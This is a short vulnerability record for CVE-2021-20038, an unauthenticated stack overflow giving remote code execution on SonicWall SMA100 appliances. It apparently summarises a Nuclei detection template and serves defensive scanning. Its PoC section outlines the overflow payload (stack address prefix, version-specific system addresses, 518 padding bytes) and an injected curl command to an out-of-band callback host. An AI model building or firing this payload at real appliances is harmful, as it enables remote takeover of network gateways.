---
cve_id: CVE-2021-20038
template_path: nuclei-templates/http/cves/2021/CVE-2021-20038.yaml
affected_product: SonicWall SMA100 Stack
severity: critical
authentication: none
external_callback: true
affected_versions: SMA 200, 210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.2-24sv and earlier versions
preconditions: []
poc_classification: rce
---

## Vulnerability
Critical stack-based buffer overflow (CWE-787, CWE-121) in SMA100 Apache httpd mod_cgi module environment variables. Remote unauthenticated attacker can achieve RCE as 'nobody' user or crash the system.  
CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H), EPSS 0.94292 (99.938th percentile).  
Impacts only listed firmware versions on SMA 200/210/400/410/500v appliances.

## PoC / Detection
Classification: rce

Template sends raw GET request to `/` with clusterbomb payload combining stack top address prefix, version-specific system addresses, and 518 repeated 'A's to overflow buffer and inject `{curl,http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'}` command. Two version-targeted payloads. Detection via interactsh matchers confirming HTTP callback protocol and exact randomized User-Agent in request.

## References
- https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis
- https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0026
- https://nvd.nist.gov/vuln/detail/CVE-2021-20038
- https://github.com/jbaines-r7/badblood
- https://github.com/Ostorlab/KEV
